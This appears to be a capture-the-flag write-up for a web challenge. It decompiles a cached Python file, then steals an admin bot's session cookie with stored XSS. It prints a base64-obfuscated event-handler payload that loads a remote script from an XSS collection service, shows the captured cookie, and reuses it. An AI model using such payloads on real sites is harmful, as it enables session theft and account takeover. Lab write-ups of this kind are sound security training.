---
layout: default
title: Shawarma Momi
---

--- 
After downloading the source code, I noticed there is `.pyc` file in the folder `__pycache__`, the file `app.cpython-312.pyc`. 

I used online service do decompile this compiled python file, using [https://pylingual.io/view_chimera?identifier=4375dd471c40bb924b2af430c1cfee47cef4790d260a699424c35033f3ddcc71](https://pylingual.io/view_chimera?identifier=4375dd471c40bb924b2af430c1cfee47cef4790d260a699424c35033f3ddcc71)

This is the flag we find in the source code `FLAG{steal_me_with_xss}`

![[Pasted image 20260306154957.png]]

Sadly, the password isn't here :(

However, It told us that we need to steal it using `xss`, I saw we are able to create html page at  `https://challenges.websec.co.il/shawarma-momi/new`, and then we send the id of the note to the bot, at `https://challenges.websec.co.il/shawarma-momi/bot`.

First, let's create the payload, I'll use payload from [https://xss.report/](https://xss.report/), create an account and then copy of one the payloads that doesn't use the tag `<script>`.

I used the next payload:
```js
"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2VsaWNvcHRlciI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; autofocus>
```

![[Pasted image 20260306155302.png]]

Now, we take the hex, for example in my case `9bb3d69af0124376817a0af923ba6643352f033fbcc94bc2beca447dd0cac12f`, and send it to the bot

![[Pasted image 20260306155354.png]]

Visit the dashboard at [https://xss.report/](https:://xss.report/), and click on the deubg to view the full report

![[Pasted image 20260306155603.png]]
![[Pasted image 20260306155622.png]]

We got the cookie:
```
session=eyJ1c2VyIjoiYWRtaW4ifQ.aarZtw.D5W96ycZ4tUwQm-Re9SlYorI6QA
```

I decoded it, the first part is `{"user":"admin"}`, Let's send request to `https://challenges.websec.co.il/shawarma-momi/admin/profile` with the cookie we stole from the bot:

![[Pasted image 20260306155738.png]]![[Pasted image 20260306155829.png]]